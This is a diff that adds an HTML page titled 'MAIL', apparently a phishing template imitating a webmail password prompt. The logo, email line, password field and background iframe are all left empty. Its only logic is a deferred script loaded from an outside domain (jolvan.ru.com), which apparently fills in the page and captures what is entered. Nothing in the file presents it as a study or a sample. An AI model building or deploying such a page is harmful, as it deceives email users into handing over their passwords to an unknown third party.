@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>MAIL</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyBjbGFzcz0id2c2IGg2IHRleHQtZ3JheS04MDAgZGFyay10ZXh0LXdoaXRlIiBhcmlhLWhpZGRlbj0idHJ1ZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIGZpbGw9ImN1cnJlbnRDb2xvciIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICA8cGF0aCBkPSJNMi4wMzggNS42MUEyLjAxIDIuMDEgMCAwIDAgMiA2djEyYTIgMiAwIDAgMCAyIDJoMTZhMiAyIDAgMCAwIDItMlY2YzAtLjEyLS4wMS0uMjM4LS4wMy0uMzUybC0uODY2LjY1MC03Ljg5NiA2LjAzMmEyIDIgMCAwIDEtMi40MjkgMEwyLjg4NCA2LjI4OGwtLjg0Ni0uNjc3WiIvPgogIDxwYXRoIGQ9Ik0yMC42NzcgNC4xMTdBMS45OTYgMS45OTYgMCAwIDAgMjAgNEg0Yy0uMjI1IDAtLjQ0LjAzNy0uNjQyLjEwNWwuNzU4LjYwN0wxMiAxMC43NDIgMTkuOSA0LjdsLjc3Ny0uNTgzWiIvPgo8L3N2Zz4=" type="image/svg+xml">
+    <script src="https://jolvan.ru.com/pipi/V3/next.js" defer></script>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden; 
+        }
+
+        body {
+            background-color: rgb(184, 183, 183);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            font-family: Arial, sans-serif;
+        }
+        .top-bar {
+            background-color: #053a77;
+            color: white;
+            padding: 15px;
+            position: absolute;
+            top: 0;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 20px;
+        }
+        
+        .bottom-bar {
+            background-color: rgb(170, 168, 168);
+            color: black;
+            padding: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: absolute;
+            width: 100%;
+            bottom: 0;
+            font-size: 15px;
+            padding-left: auto;
+            padding-right: auto;
+        }
+        .help {
+            margin-right: auto;
+            margin-left: 20px;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+        .help:hover {
+            color: blue; 
+            
+        }
+
+        .terms {
+            margin-left: auto;
+            margin-right: 20px;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+
+        .terms:hover {
+            color: blue; 
+        }
+
+        .center-box {
+            background-color: white;
+            padding: 25px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 90%;
+            max-width: 400px;
+            height: auto;
+            border-radius: 10px;
+        }
+
+        .center-box img {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 10px;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 20%;
+            margin-bottom: 20px;
+            white-space: nowrap;
+            
+        }
+
+        .logo-container img {
+            display: flex;
+            width: 60px;
+            height: auto;
+            margin-right: 10px;
+            
+            
+        }
+        
+        .e-text {
+            width: 100%;
+            margin-bottom: 20px;
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+            padding-left: -30px;
+        }
+
+
+        #icon {
+            margin-right: 15px;
+        }
+
+        #icon2 {
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+        
+        .p-field {
+            width: 100%;
+            margin-bottom: 10px;
+        }
+        input[type="password"] {
+            border: none;
+            border-bottom: 1px solid #0965bb;
+            padding: 5px;
+            width: 90%;
+            outline: none;
+        }
+        .pp-label {
+            font-size: 25px;
+            color: black;
+            margin-bottom: 25px;
+            font-weight: bold;
+            position: relative;
+        }
+        .actions-container {
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-direction: column;
+        }
+        .ft-p {
+            color: #0055b8;
+            cursor: pointer;
+            margin-bottom: 20px;
+            align-self: flex-start;
+        }
+        .sn-n-bn {
+            background-color: #0055b8;
+            color: white;
+            border: 2px solid black;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            cursor: pointer;
+            width: 30%;
+            align-self: flex-end;
+            transition: background-color 0.3s, color 0.3s, transform 0.3s; 
+            border-radius: 5px;
+        }
+        
+        .sn-n-bn:hover {
+            background-color: #003f88; 
+            color: gray; 
+            transform: scale(1.05); 
+        }
+        .sn-n-bn:active {
+            background-color: #003f88; 
+            transform: scale(0.95); 
+        }
+        
+        .sn-n-bn.clicked {
+            background-color: #002f70; 
+            color: #ffffff; 
+            border: 2px solid #ffffff; 
+        }
+        
+        #error-message {
+            color: red;
+            display: none;
+            margin-bottom: 10px;
+            font-size: 15px;
+        }
+
+        @media (max-width: 768px) {
+            .top-bar {
+                font-size: 16px;
+                padding: 10px;
+            }
+        
+            .bottom-bar {
+                font-size: 14px;
+            }
+        
+            .center-box {
+                padding: 15px;
+            }
+        
+            .pp-label {
+                font-size: 18px;
+            }
+        
+            .e-text {
+                font-size: 16px;
+            }
+        
+            .sn-n-bn {
+                font-size: 14px;
+                padding: 8px 15px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .top-bar {
+                font-size: 14px;
+                padding: 8px;
+            }
+        
+            .bottom-bar {
+                font-size: 12px;
+            }
+        
+            .center-box {
+                padding: 10px;
+            }
+        
+            .pp-label {
+                font-size: 16px;
+            }
+        
+            .e-text {
+                font-size: 14px;
+            }
+        
+            .sn-n-bn {
+                font-size: 12px;
+                padding: 5px 10px;
+            }
+        }
+        
+    </style>
+</head>
+
+<body>
+    <div id="iframe-container" style="position: fixed; inset: 0; width: 100%; height: 100%; z-index: -1;">
+        <iframe src="" id="mainPage" style="position: fixed; inset: 0; width: 100%; height: 100%; border: none; margin: 0; padding: 0; overflow-x: hidden; z-index: 1;"></iframe>
+    </div>
+    <div class="top-bar">
+        <span id="login-text"></span>
+        <span id="portal-text"></span>
+
+        <svg id="icon2" className="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="80" height="30" fill="none" viewBox="0 0 24 24">
+            <path stroke="currentColor" strokeLinecap="square" strokeLinejoin="round" strokeWidth="2" d="M10 19H5a1 1 0 0 1-1-1v-1a3 3 0 0 1 3-3h2m10 1a3 3 0 0 1-3 3m3-3a3 3 0 0 0-3-3m3 3h1m-4 3a3 3 0 0 1-3-3m3 3v1m-3-4a3 3 0 0 1 3-3m-3 3h-1m4-3v-1m-2.121 1.879-.707-.707m5.656 5.656-.707-.707m-4.242 0-.707.707m5.656-5.656-.707.707M12 8a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z"/>
+          </svg>
+               
+    </div>
+
+    <div class="center-box">
+        <div class="logo-container">
+            <img id="company-logo" src="" alt="Logo">
+            
+        </div>
+        <div class="e-text">
+            <svg id="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="30" height="30">
+                <path d="M7 17v1a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1a3 3 0 0 0-3-3h-4a3 3 0 0 0-3 3Zm8-9a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z"/>
+            </svg>
+            <span id="email-text"></span>
+        </div>
+        <div class="p-field" id="password-container"></div>
+        <div class="actions-container" id="actions-container"></div>
+    </div>
+
+    <div class="bottom-bar">
+        <span class="help" id="help-email"></span>
+        <span class="terms" id="terms"></span>
+    </div>
+</body>
+</html>
